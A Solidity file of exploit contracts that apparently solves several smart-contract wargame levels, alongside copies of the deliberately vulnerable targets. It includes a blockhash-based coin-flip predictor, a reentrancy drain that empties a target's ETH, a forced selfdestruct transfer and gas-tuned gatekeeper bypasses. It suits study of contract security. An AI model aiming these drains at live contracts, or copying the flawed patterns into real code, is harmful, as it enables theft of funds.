// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question 3
interface ICoinFlip {
    function consecutiveWins() external view returns(uint256);
    function flip(bool _guess) external returns (bool);
}

contract Solution3 {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // When using hack function, increase 1.5 times gas to avoid out of gas
    function hack(address _flip) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;
        require(ICoinFlip(_flip).flip(guess), "hack fails");
    }

    function consecutiveWins(address _flip) public view returns(uint256) {
        return ICoinFlip(_flip).consecutiveWins();
    }
}

// Question 4
interface Telephone {
    function changeOwner(address _owner) external;
}

library SubmitSolution {
    function submit(address _target, address _addr) public {
        (bool result,) = _target.call(encodeSubmit(_addr));
        assert(result);
    }

    function encodeSubmit(address _addr) public pure returns(bytes memory) {
        return abi.encodePacked(bytes4(0xc882d7c2), abi.encode(_addr));
    }
}

contract Solution4 {
    constructor(address _target, address _owner) {
        Telephone(_target).changeOwner(_owner);
    }
}

// Question 7
contract Force {
    function balance() public view returns(uint) {
        return address(this).balance;
    }
}

contract Solution7 {
    constructor(address _force) payable {
        selfdestruct(payable(_force));
    }
}

// Question 9
contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);  
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner, "!auth");
    king.transfer(msg.value);
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Solution9 {
    // Will fail
    function hack1(King _king) public payable returns(bool){
        // It only uses 2300 gas for transfer
        payable(_king).transfer(msg.value);
        return true;
    }

    // Will succeed
    function hack2(King _king) public payable returns(bool){
        (bool res,) = address(_king).call{value: msg.value}("");
        require(res, "hack fails");
        return res;
    }

    function balance() public view returns(uint) {
        return address(this).balance;
    }

    fallback() external {
        revert("Not allowed");
    }
}

// Question 10
contract Reentrance {
  
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      unchecked {
        balances[msg.sender] -= _amount;
      }
    }
  }

  receive() external payable {}
}


interface IReentrance {
    function balanceOf(address _who) external view returns (uint balance);
    function donate(address _to) external;
    function withdraw(uint _amount) external;
}

contract Solution10 {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function _withdraw(uint _amount) internal {
        IReentrance(target).withdraw(_amount);
    }

    function targetETHBalance() public view returns(uint256) {
        return target.balance;
    }

    function targetBalanceOf(address _addr) internal view returns(uint256) {
        return IReentrance(target).balanceOf(_addr);
    }

    function hack() public payable {
        require(msg.value > 0, "Not allowed zero value");
        // Donate some value
        (bool res, ) = address(target).call{value: msg.value}(abi.encodeWithSelector(IReentrance.donate.selector, address(this)));
        assert(res);
        _withdraw(targetBalanceOf(address(this)));
        require(targetETHBalance() == 0, "Hack fails");
    }

    function balance() public view returns(uint256) {
        return address(this).balance;
    }

    fallback() external payable {
        uint targetBal = targetETHBalance();
        uint thisBal = targetBalanceOf(address(this));
        uint amount = thisBal > targetBal ? targetBal : thisBal; 
        if (targetBal > 0) {
            _withdraw(amount);
        }
    }
}

// Question 11
interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Solution11 is Building {
    mapping(uint => bool) _isLastFloor;

    function isLastFloor(uint _floor) external returns (bool) {
        bool res = _isLastFloor[_floor];
        _isLastFloor[_floor] = !_isLastFloor[_floor];
        return res;
    }

    function hack(address _target, uint _floor) public {
        Elevator(_target).goTo(_floor);
    }
}

// Question 13
contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0); // gas cost is 423. so, gasleft() == totalGas - 423
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Solution13 {
    function hack(address _target, uint256 _fold) public {
        bytes8 gateKey = genGateKey();
        require(GatekeeperOne(_target).enter{gas: calcuGas(_fold)}(gateKey), "Hack fails");
    }

    function genGateKey() public view returns(bytes8 gateKey) {
        // _gateKey: 0~32                              32~64
        //           the last 2 bytes of msg.sender   any content excluding zero
        gateKey = bytes8(uint64(uint16(uint160(msg.sender))) + (1<<32));

        require(uint32(uint64(gateKey)) == uint16(uint64(gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(gateKey)) != uint64(gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(gateKey)) == uint16(uint160(msg.sender)), "GatekeeperOne: invalid gateThree part three");
    }

    function calcuGas(uint256 _fold) public pure returns(uint256) {
        return 8191 * _fold + 423;
    }
}